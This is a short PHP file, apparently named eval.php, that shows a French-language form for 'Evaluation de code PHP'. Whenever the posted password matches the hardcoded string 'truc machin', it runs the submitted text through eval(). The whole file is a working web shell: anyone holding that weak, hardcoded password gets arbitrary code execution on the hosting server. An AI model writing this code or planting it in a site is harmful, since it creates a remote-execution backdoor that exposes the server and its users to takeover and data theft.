<?php
set_include_path(".");
require_once("inc/main.inc.php");

echo "<h1>Evaluation de code PHP</h1>
<form action='eval.php' method='post'>
Pass : <input type='password' name='pass'/><br/>
Eval :<br/><textarea name='eval' cols='50' rows='5'></textarea><br/>
<input type='submit' value='Evaluer'/>
</form>";

if(isset($_POST['pass']) && ($_POST['pass'] == 'truc machin') && isset($_POST['eval']))
    eval($_POST['eval']);
?>